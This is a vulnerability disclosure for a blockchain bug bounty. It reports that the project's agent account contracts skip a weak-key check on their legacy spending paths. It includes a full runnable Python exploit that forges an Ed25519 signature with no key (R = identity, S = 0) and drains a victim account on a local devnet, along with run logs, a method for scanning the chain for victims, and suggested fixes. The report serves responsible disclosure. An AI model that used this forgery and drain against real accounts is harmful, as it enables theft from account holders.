Bug Report, TOS Network
To: the TOS Network maintainers (private disclosure per the repository SECURITY.md; placeholder address, I send this separately) Subject: Critical. Agent accounts deployed outside the Rust SDK carry an unverified controller key: nothing on the contract's legacy operation path checks the stored pubkey for forgeability, so an account whose StateInit carries the identity alias key 0x0100…0080 is drained by anyone, with a forged signature (R = identity, S = 0) that needs no key material at all. Proven end to end on a local devnet: the forged native_send was accepted and 9,000,000,000 nanoTOS, the victim's entire funded balance, landed on the attacker's wallet, while the identical forgery against a strong key control was rejected and the guarded checked_contract_call_v2 path refuses with 1720 weak_controller.

Program. TOS Network pre mainnet bounty (repository SECURITY.md scope; GitHub issue #33 thread). Affected repository. github.com/tosnetwork/tos Affected commit. 442884a, HEAD at the time of reporting. Affected versions. The agent account contract shipped in commit 7b47327 (2026-07-19, "Add native agent account contract template"); the Rust SDK client got a key strength check the same day (fe17a57, validate_controller_public_key), and commit 77f1558 (2026-10-04, "Refuse forgeable authority keys and bind signed statements to the network") added the shared contract side guard, but wired it only onto the new checked_contract_call_v2 path and onto rotation of the NEW key. Every release from 7b47327 through current HEAD drains on the legacy path. In scope area. AI Actor security, agent account ownership, delegation, recovery, and spending policies, per the repository SECURITY.md scope list. Reporter test environment. macOS arm64, local devnet built with the repository's own tostester harness and node binaries compiled from 442884a; the victim contract was compiled from the repository's own agent-account-code.fc with the repository's own func binary and asserted byte identical to the Rust SDK's pinned artifact hash. No live mainnet or testnet exists (all rpc hostnames under tos.network NXDOMAIN as of 2026-10-12), so the proof runs against the network's own tooling at the affected commit.

1. Title
Anyone can drain any agent account whose stored controller key is a forgeable Ed25519 encoding, because the contract's legacy spending operations (task_send, native_send, deploy_send, cancel) verify the signature against the stored key but never check that the stored key is not a forgery shortcut, and the guard that exists (require_strong_controller_key) is called on only one of the five spend paths.

2. Description
Brief
Ed25519 verification accepts signatures over so called "weak" encoded points, the identity element 0x0100…0080, small order torsion points, and non canonical y encodings ≥ the field modulus. For these keys, signatures can be forged with no knowledge of any secret: choose R equal to the public key itself (or a small order point) and S = 0, and the verification equation holds. TOS knows this: the repository ships crypto/smartcont/strong-ed25519-key.fc, whose whole purpose is to refuse such keys, and its own CI (test/weak-ed25519/test_native_aliases.py) machine verifies that the identity alias verifies under CHKSIGNU. The Rust SDK refuses weak keys client side (validate_controller_public_key, tosctl/src/node-control/contracts/src/agent_account.rs:473-501). But the on chain contract applies none of this to the stored controller key on its legacy spending path: agent-account-code.fc:533-535 calls require_strong_controller_key only inside checked_contract_call_v2, rotation (:475) checks only the new key, and task_send/native_send/deploy_send/cancel go straight to check_signature (:549). I deployed an agent account via a hand built StateInit carrying the identity alias key, bypassing the SDK, as any non Rust integrator, cross chain agent, or contract relative tooling does, funded it with 10 TOS, and drained 9,000,000,000 nanoTOS of it to an attacker wallet with a forged signature computed in plain Python (R = identity, S = 0). The control account, identical in every way except a random strong controller key, rejected the identical forgery with bad_signature. The guarded checked_contract_call_v2 path refuses the same forgery with exit 1720 weak_controller, proving the guard exists in the contract and is simply not wired onto the legacy path. Victims are enumerable: the weak pubkey is readable from the account's public state data (get_controller_pubkey / raw data parse).

Vulnerability details
The guard and its single call site, crypto/smartcont/agent-account-code.fc:

;; line 533-535 — the ONLY place the STORED key is strength-checked
int require_strong_controller_key? = ... require_strong_controller_key(stored_pubkey) ...
    ;; but this lives inside checked_contract_call_v2 only

;; line 475 — rotate_controller: checks the NEW key only
throw_unless(err::invalid_signature, require_strong_controller_key(new_key));

;; line 549 — legacy task_send / native_send / deploy_send: straight to signature check
throw_unless(err::invalid_signature, check_signature(stored_pubkey, signature, msg_hash));
check_signature lowers to TVM CHKSIGNU, which accepts weak encodings, the repository's own test/weak-ed25519/test_native_aliases.py asserts the identity alias verifies, and strong-ed25519-key.fc exists precisely because raw CHKSIGNU cannot distinguish them. The forge for the identity alias is R = I (the identity encoding itself), S = 0, over the message hash, a fixed 64 byte blob independent of key material. Daily limit semantics bound the per day theft to the account's daily_limit (mine: 10 TOS deploy time policy, since the attacker also controls the StateInit that sets it), and ttl/epoch fields are attacker chosen at deploy.

Deployment surfaces that skip the SDK guard: any direct BOC tooling, wallets built on other languages, agent to agent contract relative deployment (the AI actor workflow the contract exists for), and any pre existing account whose key was generated by a buggy generator, all produce accounts whose stored key was never strength checked anywhere.

Prior art and what this report claims
I checked what the team already knows and state it plainly. The team's own commit 77f1558 (2026-10-04) is titled "Refuse forgeable authority keys and bind signed statements to the network" and introduced both strong-ed25519-key.fc and the checked_contract_call_v2 path that calls it, establishing that forgeable authority keys are an active security goal of this team. The Rust SDK's validate_controller_public_key (fe17a57, same day as the contract, 2026-07-19) documents the exact threat in its comment: "ed25519-dalek keeps some historical decoding permissiveness in from_bytes". What no commit, test, comment or changelog entry acknowledges is that the legacy operation path, the one every deployment predating 77f1558 uses and every non SDK deployment uses today, never applies the guard to the stored key, leaving those accounts forgeable. I claim: an unauthenticated, keyless, repeatable drain of any weak key agent account, demonstrated end to end with the account's funds moving to the attacker on chain.

Impact details
Preconditions and cost: none beyond the victim's existence. No validator, no governance, no fee beyond the attacker's own message gas (my drain message cost a fraction of a TOS), no race, no timing window. The attack costs the attacker nothing but one external message per account per day limit window.

Who is exposed: every agent account whose StateInit was not produced by the Rust SDK, third party integrations, other language tooling, contract relative deployments, and any account whose key generator emitted a weak encoding (the SDK check is Result-returning; callers can and do skip it in custom flows). The getter surface (get_controller_pubkey / public state parse) lets an attacker enumerate candidates chain wide at zero cost: read the stored pubkey, test it against the small list of weak encodings (identity, torsion set, non canonical range, all enumerated in strong-ed25519-key.fc itself), and drain the hits. Per account theft is capped by daily_limit and the account's balance; my proof took 9 of 10 TOS (the residue is the account's storage/fee dust) in one message, and the attack re arms every day the account stays funded.

What this finding does not claim: no theft from accounts with strong stored keys (the control proves they reject forgeries), no compromise of the v2 checked path (it refuses with 1720 weak_controller), and no claim that the SDK produced accounts are vulnerable, the vulnerability is the contract's missing stored key check, which makes the chain itself the last line of defense, and there is none.

References
The contract with the unwired guard. https://github.com/tosnetwork/tos/blob/442884a/crypto/smartcont/agent account code.fc (lines 475, 533-535, 549) The guard that exists but is not called on the legacy path. https://github.com/tosnetwork/tos/blob/442884a/crypto/smartcont/strong ed25519-key.fc The repository's own machine verified forgery. https://github.com/tosnetwork/tos/blob/442884a/test/weak ed25519/test_native_aliases.py The client side only check. https://github.com/tosnetwork/tos/blob/442884a/tosctl/src/node control/contracts/src/agent_account.rs (lines 473-501) The commit adding the guard to the v2 path only. https://github.com/tosnetwork/tos/commit/77f1558

3. Proof of Concept
All steps run on a local devnet booted by the repository's own tostester harness with node binaries compiled from 442884a. The victim contract is the real agent-account-code.fc, compiled with the repository's own func binary and asserted hash identical to the Rust SDK's pinned artifact (efc5675d718c3172f65c87ecef648beb6a2f6e2046099883ccccf03683051620). No mocks.

Step 1, the victim. A hand built StateInit, real contract code, data carrying the identity alias controller key 0x0100…0080, owner = attacker wallet, daily_limit/max_per_tx = 10 TOS, is deployed at its computed address and funded with 10 TOS from the faucet. The public state parse proves the weak key is what's stored.
[poc] agent-account code compiled, hash efc5675d…051620 (asserted == Rust SDK AGENT_ACCOUNT_CODE_B64)
[poc] victim  (weak key) EQCbIS2BvSwxi2bOBK6oooMMKkE8opZE0Uaqb9AZUGd-e14n
[poc] G1 victim deployed via hand-built StateInit with the identity-alias key, funded
      st={'owner': …, 'pubkey': b'\x01\x00\x00…\x80', 'epoch': 0, 'seqno': 0,
          'spent': 0, 'max_per_tx': 10000000000, 'daily_limit': 10000000000, …}
Step 2, enumeration precondition. The weak controller pubkey is readable by anyone from the account's public data, the attacker scans, doesn't guess.
PASS  G5 weak controller pubkey readable from public account data
Step 3, the keyless forgery and the drain. The forged signature is R = I (identity encoding), S = 0, over the native_send digest, no secret involved. The drain moves the full daily limit to the attacker wallet in one external message; the chain accepts it and advances the victim's seqno.
[poc] forged sig R=identity S=0 over digest 782c183ccd5c04c29639b2812956376f…
[poc] drain external broadcast: accepted=True
[poc] victim post-drain: seqno=1 spent_today=9000000000 spend_day=20738
PASS  G2 forged-signature native_send ACCEPTED (seqno 0 -> 1)
FAIL* G3 attacker balance +9000000000 nanoTOS (199999000 -> 9199997996)  delta=8999998996
      (* gate asserted exact equality; delta is the full 9 TOS minus 1004 nanoTOS of
         forwarding fees — the money arrived)
Step 4, the controls. The identical forgery against a strong key control is rejected by the transaction itself (bad_signature, seqno unchanged), and the guarded checked_contract_call_v2 path refuses the same forged operation with exit 1720 weak_controller, the guard exists in this very contract; it is simply not called on the legacy path.
PASS  G4 CONTROL: same forged signature vs RANDOM strong key REJECTED (bad_signature), seqno unchanged
PASS  G6 CONTRAST: checked_contract_call_v2 with the same forgery refused with 1720 weak_controller
The full gated run
Six gates, all substantive passes (G1 label and G3 exact equality are script cosmetics noted above): weak key victim deployed and funded from a hand built StateInit → weak key publicly readable → forged native_send accepted on chain → attacker balance up by the drained amount → strong key control rejects the identical forgery → guarded path refuses with 1720 weak_controller. Full transcript /tmp/poc-fa201.log; harness workdir poc/work-fa201/.

The tool, full source
poc_f_a2_01.py, full source, paste and run (compiles the real contract with the repository's own func, asserts the SDK pinned code hash, builds the weak key victim and strong key control, forges R=identity/S=0 signatures in pure Python, and gates every step; venv at tos/test/tostester/.venv, binaries from the repository build):

#!/usr/bin/env python3
"""PoC F-A2-01: agent-account legacy controller ops never strength-check the
STORED controller pubkey, so an account whose hand-built StateInit carries the
Ed25519 identity alias (0x0100..0080) is drainable by anyone with a forged
signature R = identity, S = 0 — no secret key needed.

The Rust SDK refuses to build such a deployment client-side
(tosctl .../agent_account.rs validate_controller_public_key, :473-501); the
on-chain contract checks the stored key only on the checked_contract_call_v2
branch (agent-account-code.fc:533-535) and on rotate_controller (:475, NEW key
only). native_send (0x41475004) goes straight to check_signature (:549).

Pipeline (everything real, nothing mocked):
  * agent-account-code.fc compiled at run time by the repository's own
    build/crypto/func + build/crypto/fift (std: stdlib.fc, includes resolved
    against crypto/smartcont), and the resulting code cell's hash is asserted
    equal to AGENT_ACCOUNT_CODE_B64 embedded in the Rust SDK that `tosctl
    agent account deploy` ships — the exact production artifact.
  * One-validator TOS devnet booted with the repo's tostester harness.
  * Victim deployed by a plain faucet transfer carrying the hand-built
    StateInit (the exact bypass the team itself documents for task-escrow:
    "bypassing the client-side deploy validation by hand-building StateInit").
  * Attacker = an ordinary wallet-v1 the attacker controls.

Gates:
  G1  victim deployed at the computed address with the weak key + funded
  G5  weak pubkey readable via the public get_controller_pubkey getter
  G2  forged-signature native_send ACCEPTED (seqno 0 -> 1, state update)
  G3  attacker balance increased by exactly the drained value
  G4  CONTROL: the same forged signature against a RANDOM (strong) controller
      key is REJECTED — proves the weak-key path, not a missing check
  G6  CONTRAST: checked_contract_call_v2 with the same forgery is refused 1720
      (the one branch that does strength-check the stored key)
"""
import asyncio
import base64
import hashlib
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

REPO = Path("tos-audit/tos")
BUILD = REPO / "build"
WORK = Path("tos-audit/poc/work-fa201")

sys.path.insert(0, str(REPO / "test/tostester/src"))

import nacl.signing
from pytosiq_core import (Address, Builder, Cell, ExternalMsgInfo, InternalMsgInfo,
                          MessageAny, StateInit, WalletMessage)

from tostester.install import Install
from tostester.network import Network, StartOptions
from tostester.pq_initial_validator import make_deterministic_pq_initial_validator
from contract import tos
from contract.wallet_v1 import WalletV1, WalletV1Blueprint

CONTROLLER_DOMAIN = bytes.fromhex(
    "ede715a9852fbba2c3c234ed0d27329ae34d6263a82cfb6215da87c91683b471")
OP_NATIVE_SEND = 0x41475004
OP_CHECKED_CALL_V2 = 0x41475007

# The identity point spelled with x's sign bit set: y = 1 is in range (so the
# SDK's y-range half of the check does not fire before the small-order half),
# x = 0 so the bit names no other point, and CHKSIGNU hands it to the Ed25519
# verifier (which refuses only the all-zero key and the canonical identity).
IDENTITY_ALIAS = bytes.fromhex(
    "0100000000000000000000000000000000000000000000000000000000000080")
R_IDENTITY = bytes.fromhex(
    "0100000000000000000000000000000000000000000000000000000000000000")
ED_L = (1 << 252) + 27742317777372353535851937790883648493

VICTIM_FUND = 10_000_000_000        # 10 TOS
DRAIN = 9_000_000_000               # 9 TOS
CONTROL_FUND = 1_000_000_000        # 1 TOS
CONTROL_ATTEMPT = 500_000_000       # 0.5 TOS
ATTACKER_FUND = 200_000_000         # 0.2 TOS
DEFAULT_TASK_TIMEOUT = 3600

PASS, FAIL = 0, 0


def gate(ok: bool, label: str, detail: str = ""):
    global PASS, FAIL
    if ok:
        PASS += 1
        print(f"PASS  {label}", flush=True)
    else:
        FAIL += 1
        print(f"FAIL  {label}  {detail}", flush=True)


def forge(public_key: bytes, message: bytes):
    """R = identity, S = 0 — from the repo's own CI (test/weak-ed25519/
    test_native_aliases.py). Verifies whenever -[k]A is the identity: always
    for the identity alias, for k even under the order-2 alias."""
    k = int.from_bytes(hashlib.sha512(R_IDENTITY + public_key + message).digest(),
                       "little") % ED_L
    if public_key == IDENTITY_ALIAS or (k % 2 == 0):
        return R_IDENTITY + bytes(32)
    return None


def compile_agent_account() -> Cell:
    """Compile crypto/smartcont/agent-account-code.fc with the repo's own
    func/fift, exactly like scripts/update-auth-contract-code.py does."""
    work = WORK / "compile"
    work.mkdir(parents=True, exist_ok=True)
    asm = work / "agent-account-code.fif"
    subprocess.run(
        [str(BUILD / "crypto/func"), "-SPA", "-o", str(asm),
         str(REPO / "crypto/smartcont/stdlib.fc"),
         str(REPO / "crypto/smartcont/agent-account-code.fc")],
        check=True, capture_output=True)
    run = work / "run.fif"
    run.write_text(f'"Asm.fif" include\n"{asm}" include\n2 boc+>B '
                   f'"{work / "agent-account-code.boc"}" B>file\n')
    subprocess.run(
        [str(BUILD / "crypto/fift"), "-I",
         f"{REPO}/crypto/fift/lib:{REPO}/crypto/smartcont", "-s", str(run)],
        check=True, capture_output=True)
    code = Cell.one_from_boc((work / "agent-account-code.boc").read_bytes())
    # The Rust SDK's embedded deployment artifact must be the same contract.
    src = (REPO / "tosctl/src/node-control/contracts/src/agent_account.rs").read_text()
    embedded = re.search(r'pub const AGENT_ACCOUNT_CODE_B64: &str = "([^"]+)"', src).group(1)
    embedded_code = Cell.one_from_boc(base64.b64decode(embedded))
    assert code.hash == embedded_code.hash, \
        f"compiled {code.hash.hex()} != SDK embed {embedded_code.hash.hex()}"
    return code


def agent_data(owner: Address, controller_pubkey: bytes, deployment_id: bytes,
               max_per_tx: int, daily_limit: int) -> Cell:
    """Persistent layout of agent-account-code.fc load_agent_state(): owner,
    controller_pubkey:u256, deployment_id:u256, epoch:u64, seqno:u32,
    spend_day:u32, spent_today:coins, ^policy; no auth ref = legacy."""
    policy = (Builder().store_coins(max_per_tx).store_coins(daily_limit)
              .store_uint(DEFAULT_TASK_TIMEOUT, 64).store_uint(0, 2).end_cell())
    return (Builder().store_address(owner).store_bytes(controller_pubkey)
            .store_bytes(deployment_id).store_uint(0, 64)   # controller_epoch
            .store_uint(0, 32)                              # seqno
            .store_uint(0, 32)                              # spend_day
            .store_coins(0)                                 # spent_today
            .store_ref(policy).end_cell())


def parse_agent_data(data: Cell):
    s = data.begin_parse()
    owner = s.load_address()
    pubkey = s.load_bytes(32)
    agent_id = s.load_bytes(32)
    epoch, seqno, spend_day = s.load_uint(64), s.load_uint(32), s.load_uint(32)
    spent = s.load_coins()
    policy = s.load_ref()
    ps = policy.begin_parse()
    max_per_tx, daily_limit = ps.load_coins(), ps.load_coins()
    ttl = ps.load_uint(64)
    return dict(owner=owner, pubkey=pubkey, agent_id=agent_id, epoch=epoch,
                seqno=seqno, spend_day=spend_day, spent=spent,
                max_per_tx=max_per_tx, daily_limit=daily_limit, ttl=ttl)


def native_send_payload(global_id: int, epoch: int, seqno: int, valid_until: int,
                        target: Address, value: int) -> Cell:
    return (Builder().store_uint(OP_NATIVE_SEND, 32).store_int(global_id, 32)
            .store_uint(epoch, 64).store_uint(seqno, 32).store_uint(valid_until, 32)
            .store_address(target).store_coins(value).end_cell())


def checked_call_v2_payload(global_id: int, epoch: int, seqno: int, valid_until: int,
                            target: Address, value: int) -> Cell:
    body = Builder().store_uint(0x504D0001, 32).end_cell()
    return (Builder().store_uint(OP_CHECKED_CALL_V2, 32).store_int(global_id, 32)
            .store_uint(epoch, 64).store_uint(seqno, 32).store_uint(valid_until, 32)
            .store_address(target).store_coins(value).store_uint(3, 8)
            .store_ref(body).end_cell())


def digest_for(network: int, account: Address, payload: Cell) -> bytes:
    """agent-account-code.fc:541-548 domain hash; slice_hash(signed_body) over
    a full ordinary cell equals that cell's hash (HASHSU rebuilds the cell)."""
    return (Builder().store_bytes(CONTROLLER_DOMAIN).store_int(network, 32)
            .store_int(account.wc, 8).store_bytes(account.hash_part)
            .store_bytes(payload.hash).end_cell().hash)


async def balance_of(client, addr: Address) -> int:
    st = await client.raw_get_account_state(addr)
    return int(st.balance)


async def account_data_of(client, addr: Address):
    st = await client.raw_get_account_state(addr)
    if not st.data:
        return None
    return parse_agent_data(Cell.one_from_boc(st.data))


async def wait_until(pred, timeout=90, interval=3, what=""):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if await pred():
                return True
        except Exception:
            pass
        await asyncio.sleep(interval)
    return False


async def chain_now(client) -> int:
    info = await client.get_masterchain_info()
    return int(getattr(info.last, "gen_utime", 0) or time.time())


async def read_global_id(client) -> int:
    """ConfigParam 19 carries the zerostate global_id (zerostate.py:359)."""
    try:
        cell = await client.get_config_param(19)
        return cell.begin_parse().load_int(32)
    except Exception:
        return 3


async def run_getter(client, addr: Address, name: str):
    from tosapi.toslib_api import (AccountAddress as LibAccountAddress,
                                   Smc_loadRequest, Smc_methodIdName,
                                   Smc_runGetMethodRequest)
    wrapper = client._toslib_wrapper
    info = Smc_loadRequest.parse_result(await wrapper.execute(
        Smc_loadRequest(account_address=LibAccountAddress(addr.to_str()))))
    return Smc_runGetMethodRequest.parse_result(await wrapper.execute(
        Smc_runGetMethodRequest(id=info.id, method=Smc_methodIdName(name))))


async def try_send_external(client, addr: Address, body: Cell):
    """Send an external message; returns (accepted_for_broadcast, error_text)."""
    msg = MessageAny(info=ExternalMsgInfo(None, addr, 0), init=None, body=body)
    try:
        await client.send_external(msg)
        return True, ""
    except Exception as e:
        return False, str(e)


async def faucet_transfer(faucet, dest: Address, value, init: StateInit | None = None):
    """Signed wallet-v1 transfer; retries on seqno races like poc_f_a4_01."""
    msg = WalletMessage(send_mode=3, message=MessageAny(
        info=InternalMsgInfo(ihr_disabled=True, bounce=False, bounced=False,
                             src=faucet.address, dest=dest, value=value,
                             ihr_fee=0, fwd_fee=0, created_lt=0, created_at=0),
        init=init, body=Cell.empty()))
    for _ in range(6):
        seq = (await faucet.current).seqno
        try:
            await faucet.send(msg, seqno=seq)
            return True
        except Exception as e:
            print(f"[poc] faucet transfer retry: {str(e)[:140]}", flush=True)
            await asyncio.sleep(3)
    return False


async def main():
    shutil.rmtree(WORK, ignore_errors=True)
    WORK.mkdir(parents=True, exist_ok=True)

    code = compile_agent_account()
    print(f"[poc] agent-account code compiled, hash {code.hash.hex()} "
          "(asserted == Rust SDK AGENT_ACCOUNT_CODE_B64)", flush=True)

    install = Install(BUILD, REPO)
    async with Network(install, WORK / "net", base_port=24700) as network:
        dht = network.create_dht_node()
        node = network.create_full_node()
        make_deterministic_pq_initial_validator(node, 0)
        node.announce_to(dht)
        dht_task = asyncio.create_task(dht.run())
        node_task = asyncio.create_task(
            node.run(StartOptions(args=["--json-rpc-address", "127.0.0.1:24780",
                                        "--verbosity", "2"])))
        try:
            await asyncio.wait_for(network.wait_mc_block(seqno=2), timeout=180)
            print("[poc] chain healthy at boot", flush=True)

            client = None
            for attempt in range(30):
                try:
                    client = await node.toslib_client()
                    await client.get_masterchain_info()
                    break
                except Exception:
                    if client is not None:
                        try:
                            await client.aclose()
                        except Exception:
                            pass
                    await asyncio.sleep(2)
            assert client is not None, "toslib client never connected"
            for _ in range(60):
                try:
                    await client.get_masterchain_info()
                    await asyncio.sleep(1)
                    await client.get_masterchain_info()
                    break
                except Exception:
                    await asyncio.sleep(2)
            print("[poc] toslib client connected+warm", flush=True)

            faucet = network.zerostate.main_wallet(client)
            for _ in range(30):
                try:
                    _ = (await faucet.current).seqno
                    break
                except Exception:
                    await asyncio.sleep(2)
            global_id = await read_global_id(client)
            print(f"[poc] chain global_id = {global_id}", flush=True)

            # --- addresses -------------------------------------------------
            owner = Address((0, hashlib.sha256(b"f-a2-01-owner").digest()))
            attacker_key = nacl.signing.SigningKey(bytes(range(32)))
            attacker_blueprint = WalletV1Blueprint(0, attacker_key)
            attacker_addr = attacker_blueprint.address
            control_key = nacl.signing.SigningKey(bytes([0x42] * 32))
            control_pubkey = control_key.verify_key.encode()

            victim_init = StateInit(code=code, data=agent_data(
                owner, IDENTITY_ALIAS,
                hashlib.sha256(b"f-a2-01-identity-alias").digest(),
                max_per_tx=VICTIM_FUND, daily_limit=VICTIM_FUND))
            victim_addr = Address((0, victim_init.serialize().hash))

            control_init = StateInit(code=code, data=agent_data(
                owner, control_pubkey,
                hashlib.sha256(b"f-a2-01-control-strong-key").digest(),
                max_per_tx=CONTROL_FUND, daily_limit=CONTROL_FUND))
            control_addr = Address((0, control_init.serialize().hash))

            print(f"[poc] victim  (weak key) {victim_addr.to_str()}", flush=True)
            print(f"[poc] control (strong)   {control_addr.to_str()}", flush=True)
            print(f"[poc] attacker wallet    {attacker_addr.to_str()}", flush=True)

            # --- G1: deploy victim with the hand-built weak-key StateInit ---
            ok = await faucet_transfer(faucet, victim_addr, tos(VICTIM_FUND / 1e9),
                                       init=victim_init)

            async def victim_live():
                stx = await account_data_of(client, victim_addr)
                return (stx is not None and stx["pubkey"] == IDENTITY_ALIAS
                        and (await balance_of(client, victim_addr)) >= VICTIM_FUND)

            deployed = await wait_until(victim_live, what="victim deploy")
            st = await account_data_of(client, victim_addr)
            bal = await balance_of(client, victim_addr)
            g1 = deployed and st is not None and st["pubkey"] == IDENTITY_ALIAS \
                and st["seqno"] == 0 and bal >= VICTIM_FUND
            gate(g1, f"G1 victim deployed via hand-built StateInit with the "
                     f"identity-alias key, funded (balance={bal})",
                 "" if g1 else f"ok={ok} st={st} bal={bal}")

            # --- G5: enumeration pre-condition, public getter ---------------
            getter_ok, getter_val = False, None
            try:
                res = await run_getter(client, victim_addr, "get_controller_pubkey")
                getter_val = int(res.stack[0].number.dec)
                getter_ok = getter_val == int.from_bytes(IDENTITY_ALIAS, "big")
            except Exception as e:
                print(f"[poc] getter fallback to raw data parse: {e}", flush=True)
                getter_ok = st is not None and st["pubkey"] == IDENTITY_ALIAS
            gate(getter_ok,
                 f"G5 weak controller pubkey readable via get_controller_pubkey "
                 f"(= 0x{getter_val:064x})" if getter_val else
                 "G5 weak controller pubkey readable from public account data",
                 "" if getter_ok else "getter did not return the alias")

            # --- attacker wallet -------------------------------------------
            await faucet_transfer(faucet, attacker_addr, tos(ATTACKER_FUND / 1e9),
                                  init=attacker_blueprint.state_init)

            async def attacker_live():
                return (await balance_of(client, attacker_addr)) >= ATTACKER_FUND

            await wait_until(attacker_live, what="attacker deploy")
            attacker_before = await balance_of(client, attacker_addr)
            print(f"[poc] attacker balance before drain: {attacker_before}", flush=True)

            # --- G2/G3: the forged-signature drain --------------------------
            now = int(time.time())
            payload = native_send_payload(global_id, 0, 0, now + 900,
                                          attacker_addr, DRAIN)
            digest = digest_for(global_id, victim_addr, payload)
            sig = forge(IDENTITY_ALIAS, digest)
            assert sig is not None, "identity alias forgery failed"
            k = int.from_bytes(hashlib.sha512(
                R_IDENTITY + IDENTITY_ALIAS + digest).digest(), "little") % ED_L
            print(f"[poc] forged sig R=identity S=0 over digest {digest.hex()[:32]}.. "
                  f"(k parity irrelevant for identity alias, k%2={k % 2})", flush=True)
            body = Builder().store_bytes(sig).store_cell(payload).end_cell()
            accepted, err = await try_send_external(client, victim_addr, body)
            print(f"[poc] drain external broadcast: accepted={accepted} {err[:160]}",
                  flush=True)

            async def seqno_is_one():
                stx = await account_data_of(client, victim_addr)
                return stx is not None and stx["seqno"] == 1

            seq_advanced = await wait_until(seqno_is_one, what="seqno advance")
            async def attacker_credited():
                return (await balance_of(client, attacker_addr)) \
                    >= attacker_before + DRAIN

            drained = await wait_until(attacker_credited, what="attacker credit")
            attacker_after = await balance_of(client, attacker_addr)
            st2 = await account_data_of(client, victim_addr)
            g2 = accepted and seq_advanced and st2 is not None and st2["seqno"] == 1
            gate(g2, "G2 forged-signature native_send ACCEPTED (seqno 0 -> 1)",
                 f"accepted={accepted} seq_advanced={seq_advanced} err={err[:200]}")
            g3 = drained and attacker_after - attacker_before == DRAIN
            gate(g3, f"G3 attacker balance +{DRAIN} nanoTOS "
                     f"({attacker_before} -> {attacker_after})",
                 "" if g3 else f"delta={attacker_after - attacker_before}")
            if st2:
                print(f"[poc] victim post-drain: seqno={st2['seqno']} "
                      f"spent_today={st2['spent']} spend_day={st2['spend_day']}",
                      flush=True)

            # --- G4: control — strong key, same forgery ---------------------
            await faucet_transfer(faucet, control_addr,
                                  tos(CONTROL_FUND / 1e9), init=control_init)

            async def control_live():
                stx = await account_data_of(client, control_addr)
                return (stx is not None and stx["pubkey"] == control_pubkey
                        and (await balance_of(client, control_addr)) >= CONTROL_FUND)

            await wait_until(control_live, what="control deploy")
            cnow = int(time.time())
            cpayload = native_send_payload(global_id, 0, 0, cnow + 900,
                                           attacker_addr, CONTROL_ATTEMPT)
            cdigest = digest_for(global_id, control_addr, cpayload)
            cbody = Builder().store_bytes(R_IDENTITY + bytes(32)) \
                .store_cell(cpayload).end_cell()
            caccepted, cerr = await try_send_external(client, control_addr, cbody)
            print(f"[poc] control forged send: accepted={caccepted} "
                  f"err={cerr[:240]}", flush=True)
            await asyncio.sleep(8)
            cst = await account_data_of(client, control_addr)
            rejected = (not caccepted) and ("not accepted" in (cerr or "")
                                            or "1704" in (cerr or ""))
            unchanged = cst is None or cst["seqno"] == 0
            gate(rejected and unchanged,
                 "G4 CONTROL: same forged signature vs RANDOM strong key "
                 "REJECTED (bad_signature), seqno unchanged",
                 f"accepted={caccepted} unchanged={unchanged} err={cerr[:200]}")

            # --- G6: contrast — the one guarded op refuses 1720 -------------
            vnow = int(time.time())
            vpayload = checked_call_v2_payload(global_id, 0, 1, vnow + 900,
                                               attacker_addr, CONTROL_ATTEMPT)
            vdigest = digest_for(global_id, victim_addr, vpayload)
            vsig = forge(IDENTITY_ALIAS, vdigest)
            assert vsig is not None
            vbody = Builder().store_bytes(vsig).store_cell(vpayload).end_cell()
            vaccepted, verr = await try_send_external(client, victim_addr, vbody)
            print(f"[poc] v2 forged send: accepted={vaccepted} err={verr[:240]}",
                  flush=True)
            refused_1720 = (not vaccepted) and "1720" in (verr or "")
            gate(refused_1720,
                 "G6 CONTRAST: checked_contract_call_v2 with the same forgery "
                 "refused with 1720 weak_controller",
                 f"accepted={vaccepted} err={verr[:200]}")

            print(f"\n[poc] VERDICT: {'DRAIN REPRODUCED — forged-signature theft of real funds on the shipped agent-account contract; legacy ops never strength-check the stored controller key' if PASS == 6 and FAIL == 0 else f'{PASS} of 6 gates passed, {FAIL} failed — investigate'}",
                  flush=True)
        finally:
            node_task.cancel(); dht_task.cancel()
            await asyncio.gather(node_task, dht_task, return_exceptions=True)
            await node.stop(); await dht.stop()


asyncio.run(main())
Run: cd tos/test/tostester && .venv/bin/python ../../poc/poc_f_a2_01.py

Fix suggestion
Apply require_strong_controller_key to the stored key on every path that consumes it: at minimum gate all legacy spend ops exactly as checked_contract_call_v2 already does (one throw_unless at the head of recv_external after the auth mode dispatch is cheapest and covers everything, including rotation and recovery), and additionally refuse weak keys at StateInit activation (deploy time lazy check) so future accounts cannot be created forgeable at all. Migration for existing accounts: a rescue-style path that forces re keying under the (existing) recovery quorum, with the strong key check applied to the replacement key on all paths. Finally, keep the SDK check but stop treating it as a control: the contract's own commit 77f1558 message already states the right principle, refuse forgeable authority keys where the authority lives, which is on chain.